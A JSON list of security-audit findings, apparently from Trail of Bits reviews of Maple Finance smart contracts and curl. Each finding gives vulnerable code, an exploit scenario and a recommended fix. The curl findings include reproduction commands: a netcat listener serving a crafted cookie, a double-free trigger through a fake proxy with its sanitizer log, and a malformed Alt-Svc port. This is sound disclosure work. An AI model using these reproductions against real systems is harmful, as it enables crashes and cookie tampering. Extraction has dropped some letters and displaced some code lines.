        "description": "The Pool implementation of EIP-4626 is incorrect for maxDeposit and maxMint because these functions do not consider all possible cases in which deposit or mint are disabled. EIP-4626 is a standard for implementing tokenized vaults. In particular, it species the following:  maxDeposit: MUST factor in both global and user-specic limits. For example, if deposits are entirely disabled (even temporarily), it MUST return 0.  maxMint: MUST factor in both global and user-specic limits. For example, if mints are entirely disabled (even temporarily), it MUST return 0. The current implementation of maxDeposit and maxMint in the Pool contract directly call and return the result of the same functions in PoolManager (gure 6.1). As shown in gure 6.1, both functions rely on _getMaxAssets, which correctly checks that the liquidity cap has not been reached and that deposits are allowed and otherwise returns 0. However, these checks are insucient. function maxDeposit(address receiver_) external view virtual override returns (uint256 maxAssets_) { maxAssets_ = _getMaxAssets(receiver_, totalAssets()); } function maxMint(address receiver_) external view virtual override returns (uint256 maxShares_) { uint256 totalAssets_ = totalAssets(); uint256 totalSupply_ = IPoolLike(pool).totalSupply(); uint256 maxAssets_ = _getMaxAssets(receiver_, totalAssets_); maxShares_ = totalSupply_ == 0 ? maxAssets_ : maxAssets_ * totalSupply_ / totalAssets_; } [...] function _getMaxAssets(address receiver_, uint256 totalAssets_) internal view returns (uint256 maxAssets_) { bool depositAllowed_ = openToPublic || isValidLender[receiver_]; uint256 liquidityCap_ = liquidityCap; maxAssets_ = liquidityCap_ > totalAssets_ && depositAllowed_ ? liquidityCap_ - totalAssets_ : 0; } Figure 6.1: The maxDeposit and maxMint functions (pool-v2/contracts/PoolManager.sol#L451-L461) and the _getMaxAssets function (pool-v2/contracts/PoolManager.sol#L516-L520) The deposit and mint functions have a checkCall modier that will call the canCall function in the PoolManager to allow or disallow the action. This modier rst checks if the global protocol pause is active; if it is not, it will perform additional checks in _canDeposit. For this issue, it will be impossible to deposit or mint if the Pool is not active. function canCall(bytes32 functionId_, address caller_, bytes memory data_) external view override returns (bool canCall_, string memory errorMessage_) { if (IMapleGlobalsLike(globals()).protocolPaused()) { return (false, \"PM:CC:PROTOCOL_PAUSED\"); } if (functionId_ == \"P:deposit\") { ( uint256 assets_, address receiver_ ) = abi.decode(data_, (uint256, address)); } return _canDeposit(assets_, receiver_, \"P:D:\"); if (functionId_ == \"P:depositWithPermit\") { ( uint256 assets_, address receiver_, , , , ) = abi.decode(data_, (uint256, address, uint256, uint8, bytes32, bytes32)); return _canDeposit(assets_, receiver_, \"P:DWP:\"); } if (functionId_ == \"P:mint\") { ( uint256 shares_, address receiver_ ) = abi.decode(data_, (uint256, address)); \"P:M:\"); } return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, if (functionId_ == \"P:mintWithPermit\") { ( uint256 shares_, address receiver_, , , , , ) = abi.decode(data_, (uint256, address, uint256, uint256, uint8, bytes32, bytes32)); return _canDeposit(IPoolLike(pool).previewMint(shares_), receiver_, \"P:MWP:\"); } [...] function _canDeposit(uint256 assets_, address receiver_, string memory errorPrefix_) internal view returns (bool canDeposit_, string memory errorMessage_) { if (!active) return (false, _formatErrorMessage(errorPrefix_, \"NOT_ACTIVE\")); if (!openToPublic && !isValidLender[receiver_]) return (false, _formatErrorMessage(errorPrefix_, \"LENDER_NOT_ALLOWED\")); if (assets_ + totalAssets() > liquidityCap) return (false, _formatErrorMessage(errorPrefix_, \"DEPOSIT_GT_LIQ_CAP\")); return (true, \"\"); } Figure 6.2: The canCall function (pool-v2/contracts/PoolManager.sol#L370-L393), and the _canDeposit function (pool-v2/contracts/PoolManager.sol#L498-L504) The maxDeposit and maxMint functions should return 0 if the global protocol pause is active or if the Pool is not active; however, these cases are not considered. Exploit Scenario A third-party protocol wants to deposit into Maples pool. It rst calls maxDeposit to obtain the maximum amount of asserts it can deposit and then calls deposit. However, the latter function call will revert because the protocol is paused. Recommendations Short term, return 0 in maxDeposit and maxMint if the protocol is paused or if the pool is not active. Long term, maintain compliance with the EIP specication being implemented (in this case, EIP-4626).",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. setAllowedSlippage and setMinRatio functions are unreachable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The administrative functions setAllowedSlippage and setMinRatio have a requirement that they can be called only by the poolManager. However, they are not called by any reachable function in the PoolManager contract. function setAllowedSlippage(address collateralAsset_, uint256 allowedSlippage_) external override { require(msg.sender == poolManager, \"LM:SAS:NOT_POOL_MANAGER\"); require(allowedSlippage_ <= HUNDRED_PERCENT, \"LM:SAS:INVALID_SLIPPAGE\"); emit AllowedSlippageSet(collateralAsset_, allowedSlippageFor[collateralAsset_] = allowedSlippage_); } function setMinRatio(address collateralAsset_, uint256 minRatio_) external override { require(msg.sender == poolManager, \"LM:SMR:NOT_POOL_MANAGER\"); emit MinRatioSet(collateralAsset_, minRatioFor[collateralAsset_] = minRatio_); } Figure 7.1: setAllowedSlippage and setMinRatio function (pool-v2/contracts/LoanManager.sol#L75-L85) Exploit Scenario Alice, a pool administrator, needs to adjust the slippage parameter of a particular collateral token. Alices transaction reverts since she is not the poolManager contract address. Alice checks the PoolManager contract for a method through which she can set the slippage parameter, but none exists. Recommendations Short term, add functions in the PoolManager contract that can reach setAllowedSlippage and setMinRatio on the LoanManager contract. Long term, add unit tests that validate all system parameters can be updated successfully.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Inaccurate accounting of unrealizedLosses during default warning revert ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "During the process of executing the removeDefaultWarning function, an accounting discrepancy fails to decrement netLateInterest from unrealizedLosses, resulting in an over-inated value. The triggerDefaultWarning function updates unrealizedLosses with the defaulting loans principal_, netInterest_, and netLateInterest_ values. emit UnrealizedLossesUpdated(unrealizedLosses += _uint128(principal_ + netInterest_ + netLateInterest_)); Figure 8.1: The triggerDefaultWarning function (pool-v2/contracts/LoanManager.sol#L331) When the warning is removed by the _revertDefaultWarning function, only the values of the defaulting loans principal and interest are decremented from unrealizedLosses. This leaves a discrepancy equal to the amount of netLateInterest_. function _revertDefaultWarning(LiquidationInfo memory liquidationInfo_) internal { accountedInterest -= _uint112(liquidationInfo_.interest); unrealizedLosses -= _uint128(liquidationInfo_.principal + liquidationInfo_.interest); } Figure 8.2: The _revertDefaultWarning function (pool-v2/contracts/LoanManager.sol#L631-L634) Exploit Scenario Alice has missed several interest payments on her loan and is about to default. Bob, the poolManager, calls triggerDefaultWarning on the loan to account for the unrealized loss in the system. Alice makes a payment to bring the loan back into good standing, the claim function is triggered, and _revertDefaultWarning is called to remove the unrealized loss from the system. The net value of Alices loans late interest value is still accounted for in the value of unrealizedLosses. From then on, when users call Pool.withdraw, they will have to exchange more shares than are due for the same amount of assets. Recommendations Short term, add the value of netLateInterest to the amount decremented from unrealizedLosses when removing the default warning from the system. Long term, implement robust unit-tests and fuzz tests to validate math and accounting ows throughout the system to account for any unexpected accounting discrepancies.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Attackers can prevent the pool manager from nishing liquidation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The finishCollateralLiquidation function requires that a liquidation is no longer active. However, an attacker can prevent the liquidation from nishing by sending a minimal amount of collateral token to the liquidator address. function finishCollateralLiquidation(address loan_) external override nonReentrant returns (uint256 remainingLosses_, uint256 platformFees_) { require(msg.sender == poolManager, \"LM:FCL:NOT_POOL_MANAGER\"); require(!isLiquidationActive(loan_), \"LM:FCL:LIQ_STILL_ACTIVE\"); [...] if (toTreasury_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, mapleTreasury(), toTreasury_); if (toPool_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, pool, toPool_); if (recoveredFunds_ != 0) ILiquidatorLike(liquidationInfo_.liquidator).pullFunds(fundsAsset, ILoanLike(loan_).borrower(), recoveredFunds_); Figure 9.1: An excerpt of the finishCollateralLiquidation function (pool-v2/contracts/LoanManager.sol#L199-L232) The finishCollateralLiquidation function uses the isLiquidationActive function to verify if the liquidation process is nished by checking the collateral asset balance of the liquidator address. Because anyone can send tokens to that address, it is possible to make isLiquidationActive always return false. function isLiquidationActive(address loan_) public view override returns (bool isActive_) { address liquidatorAddress_ = liquidationInfo[loan_].liquidator; // TODO: Investigate dust collateralAsset will ensure `isLiquidationActive` is always true. isActive_ = (liquidatorAddress_ != address(0)) && (IERC20Like(ILoanLike(loan_).collateralAsset()).balanceOf(liquidatorAddress_) != uint256(0)); } Figure 9.2: The isLiquidationActive function (pool-v2/contracts/LoanManager.sol#L702-L707) Exploit Scenario Alice's loan is being liquidated. Bob, the pool manager, tries to call finishCollateralLiquidation to get back the recovered funds. Eve front-runs Bobs call by sending 1 token of the collateral asset to the liquidator address. As a consequence, Bob cannot recover the funds. Recommendations Short term, use a storage variable to track the remaining collateral in the Liquidator contract. As a result, the collateral balance cannot be manipulated through the transfer of tokens and can be safely checked in isLiquidationActive. Long term, avoid using exact comparisons for ether and token balances, as users can increase those balances by executing transfers, making the comparisons evaluate to false.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. WithdrawalManager can have an invalid exit conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The setExitConfig function sets the conguration to exit from the pool. However, unsafe casting allows this function to set an invalid conguration. The function performs a few initial checks; for example, it checks that windowDuration is not 0 and that windowDuration is less than cycleDuration. However, when setting the conguration, the initialCycleId_, initialCycleTime_, cycleDuration_, and windowDuration_ are unsafely casted to uint64 from uint256. In particular, cycleDuration_ and windowDuration_ are user-controlled by the poolDelegate. function setExitConfig(uint256 cycleDuration_, uint256 windowDuration_) external override { CycleConfig memory config_ = _getCurrentConfig(); require(msg.sender == poolDelegate(), \"WM:SEC:NOT_AUTHORIZED\"); require(windowDuration_ != 0, \"WM:SEC:ZERO_WINDOW\"); require(windowDuration_ <= cycleDuration_, \"WM:SEC:WINDOW_OOB\"); require( cycleDuration_ != config_.cycleDuration || windowDuration_ != config_.windowDuration, \"WM:SEC:IDENTICAL_CONFIG\" ); [...] cycleConfigs[latestConfigId_] = CycleConfig({ initialCycleId: uint64(initialCycleId_), initialCycleTime: uint64(initialCycleTime_), cycleDuration: uint64(cycleDuration_), windowDuration: uint64(windowDuration_) }); } Figure 10.1: The setExitConfig function (withdrawal-manager/contracts/WithdrawalManager.sol#L83-L115) Exploit Scenario Bob, the pool delegate, calls setExitCong with cycleDuration_ equal to type(uint64).max + 1 and windowDuration_ equal to type(uint64).max. The checks pass, but the conguration does not adhere to the invariant windowDuration <= cycleDuration. Recommendations Short term, safely cast the variables when setting the conguration to avoid any possible errors. Long term, improve the unit-tests to check that important invariants always hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Loan can be impaired when the protocol is paused ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The impairLoan function allows the poolDelegate or governor to impair a loan when the protocol is paused due to a missing whenProtocolNotPaused modier. The role of this function is to mark the loan at risk of default by updating the loans nextPaymentDueDate. Although it would be impossible to default the loan in a paused state (because the triggerDefault function correctly has the whenProtocolNotPaused modier), it is unclear if the other state variable changes would be a problem in a paused system. Additionally, if the protocol is unpaused, it is possible to call removeLoanImpairment and restore the loans previous state. function impairLoan(address loan_) external override { bool isGovernor_ = msg.sender == governor(); require(msg.sender == poolDelegate || isGovernor_, \"PM:IL:NOT_AUTHORIZED\"); ILoanManagerLike(loanManagers[loan_]).impairLoan(loan_, isGovernor_); emit LoanImpaired(loan_, block.timestamp); } Figure 11.1: The impairLoan function (pool-v2/contracts/PoolManager.sol#L307-315) Exploit Scenario Bob, the MapleGlobal security admin, sets the protocol in a paused state due to an unknown occurrence, expecting the protocols state to not change and debugging the possible issue. Alice, a pool delegate who does not know that the protocol is paused, calls impairLoan, thereby changing the state and making Bobs debugging more dicult. Recommendations Short term, add the missing whenProtocolNotPaused modier to the impairLoan function. Long term, improve the unit-tests to check for the correct system behavior when the protocol is paused and unpaused. Additionally, integrate the Slither script in appendix D into the development workow.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Fee treasury could go to the zero address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-maplefinance-mapleprotocolv2-securityreview.pdf",
        "description": "The _disburseLiquidationFunds and _distributeClaimedFunds functions, which send the fees to the various actors, do not check that the mapleTreasury address was set. Althoughthe mapleTreasury address is supposedly set immediately after the creation of the MapleGlobals contract, no checks prevent sending the fees to the zero address, leading to a loss for Maple. function _disburseLiquidationFunds(address loan_, uint256 recoveredFunds_, uint256 platformFees_, uint256 remainingLosses_) internal returns (uint256 updatedRemainingLosses_, uint256 updatedPlatformFees_) { [...] require(toTreasury_ == 0 || ERC20Helper.transfer(fundsAsset_, mapleTreasury(), toTreasury_), \"LM:DLF:TRANSFER_MT_FAILED\"); Figure 12.1: The _disburseLiquidationFunds function (pool-v2/contracts/LoanManager.sol#L566-L584) Exploit Scenario Bob, a Maple admin, sets up the protocol but forgets to set the mapleTreasury address. Since there are no warnings, the expected claim or liquidation fees are sent to the zero address until the Maple team notices the issue. Recommendations Short term, add a check that the mapleTreasury is not set to address zero in _disburseLiquidationFunds and _distributeClaimedFunds. Long term, improve the unit and integration tests to check that the system behaves correctly both for the happy case and the non-happy case.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Bad recommendation in libcurl cookie documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "The libcurl documentation recommends that, to enable the cookie store with a blank cookie database, the calling application should use the CURLOPT_COOKIEFILE option with a non-existing le name or plain  , as shown in gure 1.1. However, the former recommendationa non-blank lename with a target that does not existcan have unexpected results if a le by that name is unexpectedly present. Figure 1.1: The recommendation in libcurls documentation Exploit Scenario An inexperienced developer uses libcurl in his application, invoking the CURLOPT_COOKIEFILE option and hard-coding a lename that he thinks will never exist (e.g., a long random string), but which could potentially be created on the lesystem. An attacker reverse-engineers his program to determine the lename and path in question, and then uses a separate local le write vulnerability to inject cookies into the application. Recommendations Short term, remove the reference to a non-existing le name; mention only a blank string. Long term, avoid suggesting tricks such as this in documentation when a misuse or misunderstanding of them could result in side eects of which users may be unaware.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Libcurl URI parser accepts invalid characters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "According to RFC 3986 section 2.2, Reserved Characters, reserved = gen-delims / sub-delims gen-delims = \":\" / \"/\" / \"?\" / \"#\" / \"[\" / \"]\" / \"@\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.1: Reserved characters for URIs. Furthermore, the host eld of the URI is dened as follows: host = IP-literal / IPv4address / reg-name reg-name = *( unreserved / pct-encoded / sub-delims ) ... unreserved = ALPHA / DIGIT / \"-\" / \".\" / \"_\" / \"~\" sub-delims = \"!\" / \"$\" / \"&\" / \"'\" / \"(\" / \")\" / \"*\" / \"+\" / \",\" / \";\" / \"=\" Figure 2.2: Valid characters for the URI host eld However, cURL does not seem to strictly adhere to this format, as it accepts characters not included in the above. This behavior is present in both libcurl and the cURL binary. For instance, characters from the gen-delims set, and those not in the reg-name set, are accepted: $ curl -g \"http://foo[]bar\" # from gen-delims curl: (6) Could not resolve host: foo[]bar $ curl -g \"http://foo{}bar\" # outside of reg-name curl: (6) Could not resolve host: foo{}bar Figure 2.3: Valid characters for the URI host eld The exploitability and impact of this issue is not yet well understood; this may be deliberate behavior to account for currently unknown edge-cases or legacy support. Recommendations Short term, determine whether these characters are being allowed for compatibility reasons. If so, it is likely that nothing can be done; if not, however, make the URI parser stricter, rejecting characters that cannot appear in a valid URI as dened by RFC 3986. Long term, add fuzz tests for the URI parser that use forbidden or out-of-scope characters.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. libcurl Alt-Svc parser accepts invalid port numbers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "Invalid port numbers in Alt-Svc headers, such as negative numbers, may be accepted by libcurl when presented by an HTTP server. libcurl uses the strtoul function to parse port numbers in Alt-Svc headers. This function will accept and parse negative numbers and represent them as unsigned integers without indicating an error. For example, when an HTTP server provides an invalid port number of -18446744073709543616, cURL parses the number as 8000: * Using HTTP2, server supports multiplexing * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x12d013600) > GET / HTTP/2 > Host: localhost:2443 > user-agent: curl/7.79.1 > accept: */* > < HTTP/2 200 < server: basic-h2-server/1.0 < content-length: 130 < content-type: application/json * Added alt-svc: localhost: 8000 over h3 < alt-svc: h3=\": -18446744073709543616 \" < Figure 3.1: Example cURL session Exploit Scenario A server operator wishes to target cURL clients and serve them alternative content. The operator includes a specially-crafted, invalid Alt-Svc header on the HTTP server responses, indicating that HTTP/3 is available on port -18446744073709543616 , an invalid, negative port number. When users connect to the HTTP server using standards-compliant HTTP client software, their clients ignore the invalid header. However, when users connect using cURL, it interprets the negative number as an unsigned integer and uses the resulting port number, 8000 , to upgrade the next connection to HTTP/3. The server operator hosts alternative content on this other port. Recommendations Short term, improve parsing and validation of Alt-Svc headers so that invalid port values are rejected. Long term, add fuzz and dierential tests to the Alt-Svc parsing code to detect non-standard behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Non-constant-time comparison of secrets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "Several cases were discovered in which possibly user-supplied values are checked against a known secret using non-constant-time comparison. In cases where an attacker can accurately time how long it takes for the application to fail validation of submitted data that he controls, such behavior could leak information about the secret itself, allowing the attacker to brute-force it in linear time. In the example below, credentials are checked via Curl_safecmp() , which is a memory-safe, but not constant-time, wrapper around strcmp() . This is used to determine whether or not to reuse an existing TLS connection. #ifdef USE_TLS_SRP Curl_safecmp(data->username, needle->username) && Curl_safecmp(data->password, needle->password) && (data->authtype == needle->authtype) && #endif Figure 4.1: lib/url.c , lines 148 through 152. Credentials checked using a memory-safe, but not constant-time, wrapper around strcmp() The above is one example out of several cases found, all of which are noted above. Exploit Scenario An application uses a libcurl build with TLS-SRP enabled and allows multiple users to make TLS connections to a remote server. An attacker times how quickly cURL responds to his requests to create a connection, and thereby gradually works out the credentials associated with an existing connection. Eventually, he is able to submit a request with exactly the same SSL conguration such that another users existing connection is reused. Recommendations Short term, introduce a method, e.g. Curl_constcmp() , which does a constant-time comparison of two stringsthat is, it scans both strings exactly once in their entirety. Long term, compare secrets to user-submitted values using only constant-time algorithms.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Tab injection in cookie le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "When libcurl makes an HTTP request, the cookie jar le is overwritten to store the cookies, but the storage format uses tabs to separate key pieces of information. The cookie parsing code for HTTP headers strips the leading and trailing tabs from cookie keys and values, but it does not reject cookies with tabs inside the keys or values. In the snippet of lib/cookie.c below, Curl_cookie_add() parses tab-separated cookie data via strtok_r() and uses a switch-based state machine to interpret specic parts as key information: firstptr = strtok_r(lineptr, \"\\t\" , &tok_buf); /* tokenize it on the TAB */ Figure 5.1: Parsing tab-separated cookie data via strtok_r() Exploit Scenario A webpage returns a Set-Cookie header with a tab character in the cookie name. When a cookie le is saved from cURL for this page, the part of the name before the tab is taken as the key, and the part after the tab is taken as the value. The next time the cookie le is loaded, these two values will be used. % echo \"HTTP/1.1 200 OK\\r\\nSet-Cookie: foo\\tbar=\\r\\n\\r\\n\\r\\n\"|nc -l 8000 & % curl -v -c /tmp/cookies.txt http://localhost:8000 * Trying 127.0.0.1:8000... * Connected to localhost (127.0.0.1) port 8000 (#0) > GET / HTTP/1.1 > Host: localhost:8000 > User-Agent: curl/7.79.1 > Accept: */* * Mark bundle as not supporting multiuse < HTTP/1.1 200 OK * Added cookie foo bar=\"\" for domain localhost, path /, expire 0 < Set-Cookie: foo bar= * no chunk, no close, no size. Assume close to signal end Figure 5.2: Sending a cookie with name foo\\tbar , and no value. % cat /tmp/cookies.txt | tail - localhost FALSE / FALSE 0 foo bar Figure 5.3: Sending a cookie with name foo\\tbar and no value Recommendations Short term, either reject any cookie with a tab in its key (as \\t is not a valid character for cookie keys, according to the relevant RFC), or escape or quote tab characters that appear in cookie keys. Long term, do not assume that external data will follow the intended specication. Always account for the presence of special characters in such inputs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Standard output/input/error may not be opened ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "The function main_checkfds() is used to ensure that le descriptors 0, 1, and 2 (stdin, stdout, and stderr) are open before curl starts to run. This is necessary to avoid the case wherein, if one of those descriptors fails to open initially, the next network socket opened by cURL may gain an FD number of 0, 1, or 2, resulting in what should be local input/output being received from or sent to a network socket instead. However, pipe errors actually result in the same outcome as success: static void main_checkfds ( void ) { #ifdef HAVE_PIPE int fd[ 2 ] = { STDIN_FILENO, STDIN_FILENO }; while (fd[ 0 ] == STDIN_FILENO || fd[ 0 ] == STDOUT_FILENO || fd[ 0 ] == STDERR_FILENO || fd[ 1 ] == STDIN_FILENO || fd[ 1 ] == STDOUT_FILENO || fd[ 1 ] == STDERR_FILENO) if (pipe(fd) < 0 ) return ; /* Out of handles. This isn't really a big problem now, but will be when we try to create a socket later. */ close(fd[ 0 ]); close(fd[ 1 ]); #endif } Figure 6.1: tool_main.c:83105 , lines 83 through 105 Though the comment notes that an out-of-handles condition would result in a failure later on in the application, there may be cases where this is not truee.g., the maximum number of handles has been reached at the time of this check, but handles are closed between it and the next attempt to create a socket. In such a case, execution might continue as normal, with stdin/out/err being redirected to an unexpected location. Recommendations Short term, use fcntl() to check if stdin/out/err are open. If they are not, exit the program if the pipe function fails. Long term, do not assume that execution will fail later; fail early in cases like these.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Double free when using HTTP proxy with specic protocols ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "Using cURL with proxy connection and dict, gopher, LDAP, or telnet protocol triggers a double free vulnerability (gure 7.1). The connect_init function allocates a memory block for a connectdata struct (gure 7.2). After the connection, cURL frees the allocated buer in the conn_free function (gure 7.3), which is freed for the second time in the Curl_free_request_state frees, which uses the Curl_safefree function on elements of the Curl_easy struct (gure 7.4). This double free was also not detected in release builds during our testing  the glibc allocator checks may fail to detect such cases on some occasions. The two frees success indicates that future memory allocations made by the program will return the same pointer twice. This may enable exploitation of cURL if the allocated objects contain data controlled by an attacker. Additionally, if this vulnerability also triggers in libcurlwhich we believe it shouldit may enable the exploitation of programs that depend on libcurl. $ nc -l 1337 | echo 'test' & # Imitation of a proxy server using netcat $ curl -x http://test:test@127.0.0.1:1337 dict://127.0.0.1 2069694==ERROR: AddressSanitizer: attempting double-free on 0x617000000780 in thread T0: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf3afe in Curl_free_request_state curl/lib/url.c:2259:3 #2 0x7f1eeeaf3afe in Curl_close curl/lib/url.c:421:3 #3 0x7f1eeea30943 in curl_easy_cleanup curl/lib/easy.c:798:3 #4 0x4e07df in post_per_transfer curl/src/tool_operate.c:656:3 #5 0x4dee58 in serial_transfers curl/src/tool_operate.c:2434:18 #6 0x4dee58 in run_all_transfers curl/src/tool_operate.c:2620:16 #7 0x4dee58 in operate curl/src/tool_operate.c:2732:18 #8 0x4dcf73 in main curl/src/tool_main.c:276:14 #9 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #10 0x41c7cd in _start (curl/src/.libs/curl+0x41c7cd) 0x617000000780 is located 0 bytes inside of 664-byte region [0x617000000780,0x617000000a18) freed by thread T0 here: #0 0x494c8d in free (curl/src/.libs/curl+0x494c8d) #1 0x7f1eeeaf6094 in conn_free curl/lib/url.c:814:3 #2 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684: #3 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #4 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #5 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #6 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #7 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #8 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #9 0x4dcf73 in main curl/src/tool_main.c:276:14 #10 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 previously allocated by thread T0 here: #0 0x495082 in calloc (curl/src/.libs/curl+0x495082) #1 0x7f1eeea6d642 in connect_init curl/lib/http_proxy.c:174:9 #2 0x7f1eeea6d642 in Curl_proxyCONNECT curl/lib/http_proxy.c:1061:14 #3 0x7f1eeea6d1f2 in Curl_proxy_connect curl/lib/http_proxy.c:118:14 #4 0x7f1eeea94c33 in multi_runsingle curl/lib/multi.c:2028:16 #5 0x7f1eeea92cc6 in curl_multi_perform curl/lib/multi.c:2684:14 #6 0x7f1eeea304bd in easy_transfer curl/lib/easy.c:662:15 #7 0x7f1eeea304bd in easy_perform curl/lib/easy.c:752:42 #8 0x7f1eeea304bd in curl_easy_perform curl/lib/easy.c:771:10 #9 0x4dee35 in serial_transfers curl/src/tool_operate.c:2432:16 #10 0x4dee35 in run_all_transfers curl/src/tool_operate.c:2620:16 #11 0x4dee35 in operate curl/src/tool_operate.c:2732:18 #12 0x4dcf73 in main curl/src/tool_main.c:276:14 #13 0x7f1eee2af082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: double-free (curl/src/.libs/curl+0x494c8d) in free Figure 7.1: Reproducing double free vulnerability with ASAN log 158 static CURLcode connect_init ( struct Curl_easy *data, bool reinit) // (...) 174 s = calloc( 1 , sizeof ( struct http_connect_state )); Figure 7.2: Allocating a block of memory that is freed twice ( curl/lib/http_proxy.c#158174 ) 787 static void conn_free ( struct connectdata *conn) // (...) 814 Curl_safefree(conn->connect_state); Figure 7.3: The conn_free function that frees the http_connect_state struct for HTTP CONNECT ( curl/lib/url.c#787814 ) void Curl_free_request_state ( struct Curl_easy *data) 2257 2258 { 2259 2260 Curl_safefree(data->req.p.http); Curl_safefree(data->req.newurl); Figure 7.4: The Curl_free_request_state function that frees elements in the Curl_easy struct, which leads to a double free vulnerability ( curl/lib/url.c#22572260 ) Exploit Scenario An attacker nds a way to exploit the double free vulnerability described in this nding either in cURL or in a program that uses libcurl and gets remote code execution on the machine from which the cURL code was executed. Recommendations Short term, x the double free vulnerability described in this nding. Long term, expand cURLs unit tests and fuzz tests to cover dierent types of proxies for supported protocols. Also, extend the fuzzing strategy to cover argv fuzzing. It can be obtained using the approach presented in the argv-fuzz-inl.h from the AFL++ project. This will force the fuzzer to build an argv pointer array (which points to arguments passed to the cURL) from NULL-delimited standard input. Finally, consider adding a dictionary with possible options and protocols to the fuzzer based on the source code or on cURLs manual.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Some ags override previous instances of themselves ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
        "description": "Some cURL ags, when provided multiple times, overrides themselves and eectively use the last ag provided. If a ag makes cURL invocations security options more strict, then accidental overwriting may weaken the desired security. The identied ag with this property is the --crlfile command-line option. It allows users to pass a PEM-formatted certicate revocation list to cURL. --crlfile <file> List that may specify peer certificates that are to be considered revoked. (TLS) Provide a file using PEM format with a Certificate Revocation If this option is used several times, the last one will be used. Example: curl --crlfile rejects.txt https://example.com Added in 7.19.7. Figure 8.1: The description of the --crlfile option Exploit Scenario A user wishes for cURL to reject certicates specied across multiple certicate revocation lists. He unwittingly uses the --crlfile ag multiple times, dropping all but the last-specied list. Requests the user sends with cURL are intercepted by a Man-in-the-Middle attacker, who uses a known-compromised certicate to bypass TLS protections. Recommendations Short term, change the behavior of --crlfile to append new certicates to the revocation list, not to replace those specied earlier. If backwards compatibility prevents this, have cURL issue a warning such as  --crlfile specified multiple times, using only <filename.txt> . Long term, ensure that behavior, such as how multiple instances of a command-line argument are handled, is consistent throughout the application. Issue a warning when a security-relevant ag is provided multiple times.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Cookies are not stripped after redirect ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-curl-securityreview.pdf",
